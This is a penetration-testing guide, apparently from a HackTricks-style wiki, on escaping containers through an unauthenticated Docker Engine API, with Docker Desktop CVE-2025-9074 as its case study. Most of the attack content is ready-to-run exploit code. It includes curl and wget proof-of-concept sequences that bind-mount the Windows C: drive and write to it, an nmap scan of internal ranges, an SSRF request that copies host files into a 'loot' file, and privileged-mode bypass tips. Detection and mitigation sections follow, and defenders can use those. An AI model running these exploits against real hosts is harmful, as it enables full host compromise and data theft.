# Abusing Docker Engine API (TCP 2375/2376) for Container Escape

{{#include ../../banners/hacktricks-training.md}}

This page explains how to detect, exploit, and defend against exposed Docker Engine HTTP API endpoints reachable from containers or via SSRF, including the Docker Desktop CVE-2025-9074 scenario.

## Overview

- The Docker Engine exposes a REST API typically bound to:
  - tcp/2375 over HTTP (no TLS)
  - tcp/2376 over HTTPS (TLS)
  - unix:///var/run/docker.sock (local socket)
- If the TCP API is reachable by untrusted workloads (pods/containers) without authentication, an attacker can create and start containers with bind mounts and/or privileged mode to operate on the host filesystem and devices, achieving a full container escape and effective host compromise.
- On Docker Desktop for Windows/macOS, the Docker Engine runs inside a Linux VM and provides host file sharing. If the Engine API is exposed to containers (as in CVE-2025-9074), bind mounts can directly write to the Windows/macOS host filesystem.

## Verify Exposure

From inside any container or via an SSRF primitive capable of HTTP requests:

```bash
# Plain HTTP probe (2375)
curl -s http://<engine-ip>:2375/_ping   # -> OK
curl -s http://<engine-ip>:2375/version # Engine version
curl -s http://<engine-ip>:2375/info    # Info/driver details

# TLS probe (2376) requires client certs normally; if misconfigured, it may allow unauthenticated TLS
```

Typical Engine IPs in desktop setups are in a private range. On Docker Desktop for Windows the engine was reachable at 192.168.65.7:2375 in the vulnerable builds. Enumerate and scan internal ranges from a compromised container:

```bash
# Quick scan for a few likely ranges
nmap -Pn -sT -p 2375,2376 192.168.65.0/24 192.168.64.0/24 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 --open
```

## Two-call Host Takeover via API

The minimum sequence to execute code against the host via bind mounts:

1) POST /containers/create with HostConfig.Binds to mount a host path into the new container and a startup Cmd to operate on that mount.
2) POST /containers/{id}/start to run it.

Example (works from any Linux container that can reach the Engine API):

```bash
# Windows host via Docker Desktop: share Windows C: into container at /host_root
# Note the special path format on Windows Docker Desktop: /mnt/host/c maps to C:\ on the Windows host

curl -s -H 'Content-Type: application/json' \
  -d '{
        "Image":"alpine",
        "Cmd":["sh","-c","echo pwned > /host_root/pwn.txt"],
        "HostConfig":{
          "Binds":["/mnt/host/c:/host_root"]
        }
      }' \
  http://192.168.65.7:2375/containers/create > create.json

CID=$(jq -r .Id create.json)
# If jq is unavailable, you can extract the ID with cut/awk

curl -s -X POST http://192.168.65.7:2375/containers/$CID/start
```

What this does:
- HostConfig.Binds maps the Windows host C: drive into the container at /host_root using the Docker Desktop path translation ("/mnt/host/c:/host_root").
- The startup command writes a file on the mounted path, landing at C:\pwn.txt on the Windows host.

Optional hardening bypasses:
- Privileged container: add "Privileged": true under HostConfig to gain broader device/namespace access on Linux hosts.
- Host network: add "NetworkMode": "host" if network namespaces need to be bypassed (where applicable).

### macOS Docker Desktop notes

On Docker Desktop for macOS, the Engine runs in a Linux VM with file sharing of select host paths. Common shares include:
- /Users
- /Volumes
- /private
- /tmp

You can use HostConfig.Binds to mount these into a container and operate on the macOS host files, for example:

```json
{
  "Image": "alpine",
  "Cmd": ["sh","-c","ls -la /host_users"],
  "HostConfig": {
    "Binds": ["/Users:/host_users"]
  }
}
```

## SSRF-only Compromise

An interactive shell is not required. Any service running in a container with an SSRF primitive that can send JSON POST requests with Content-Type: application/json to the Engine API can perform the same two-call sequence:

```http
POST http://<engine-ip>:2375/containers/create
Content-Type: application/json

{"Image":"alpine","Cmd":["sh","-c","cat /host_root/Windows/System32/drivers/etc/hosts > /host_root/Temp/loot.txt"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}

POST http://<engine-ip>:2375/containers/<id>/start
```

This results in reading/writing arbitrary host files. Attackers can exfiltrate data or drop executables on the host.

## Detection

- Monitor Docker Engine API usage for unexpected container lifecycle calls from container network ranges:
  - POST /containers/create
  - POST /containers/*/start
  - DELETE /containers/* (cleanup by attacker)
- Alert on suspicious HostConfig in creates:
  - Binds referencing Windows drive letters (e.g., /mnt/host/c:), macOS shared paths (/Users, /Volumes, /private, /tmp), or sensitive Linux paths (/etc, /root, /var/run/docker.sock).
  - Privileged: true, HostNetwork, or extensive CapAdd.
- File integrity or endpoint telemetry on the host for sudden creation/modification of artifacts (e.g., C:\pwn.txt) immediately after container starts.
- Network telemetry: access to Engine IP:2375/2376 originating from workloads.

## Mitigations

- Never expose the Docker Engine API over TCP without proper TLS and authentication. Prefer the local unix socket with strict permissions.
- On Docker Desktop, ensure the Engine API is not reachable from containers and untrusted networks. Update to a fixed version.
- Enforce strict network segmentation between control plane (Engine API) and workloads; assume zero trust for all internal endpoints.
- Restrict bind mounts via policies and admissions where possible (e.g., disallow hostPath or sensitive binds in orchestrators).

## Case study: Docker Desktop CVE-2025-9074

- Root cause: Docker Desktop for Windows exposed the Engine HTTP API (http://192.168.65.7:2375) to containers without authentication. Any container, or an SSRF within one, could control the host.
- Impact: Full container escape by creating a container that bind-mounted the Windows C: drive and executed arbitrary file operations on the host.
- Exploit flow: exactly the two-call sequence above: POST /containers/create with HostConfig.Binds + startup Cmd, then POST /containers/{id}/start.
- A collaborator reproduced a similar issue on macOS.
- Fix: Update Docker Desktop (refer to vendor release notes for fixed builds).

Minimal PoC (wget variant as seen in the write-up):

```bash
wget --header='Content-Type: application/json' \
  --post-data='{"Image":"alpine","Cmd":["sh","-c","echo pwned > /host_root/pwn.txt"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}' \
  -O - http://192.168.65.7:2375/containers/create > create.json
cid=$(cut -d'"' -f4 create.json)
wget --post-data='' -O - http://192.168.65.7:2375/containers/$cid/start
```

## Related Techniques

- Local socket abuse: mounting /var/run/docker.sock into a container and then using docker to control the host.
- Orchestrator-specific controls (Kubernetes, ECS, etc.) may prevent or enable variants of these attacks depending on policies.

## References

- [Full Docker Desktop Escape via Exposed Docker API (CVE-2025-9074)](https://blog.qwertysecurity.com/Articles/blog3.html)
- [CVE-2025-9074](https://www.cve.org/CVERecord?id=CVE-2025-9074)
- [Docker Desktop 4.44.x Release Notes](https://docs.docker.com/desktop/release-notes/#4443)
- [Breaking Docker's isolation using Docker (CVE-2025-9074) - Pvotal Tech](https://pvotal.tech/breaking-dockers-isolation-using-docker-cve-2025-9074/)
- [Nmap](https://nmap.org/)

{{#include ../../banners/hacktricks-training.md}}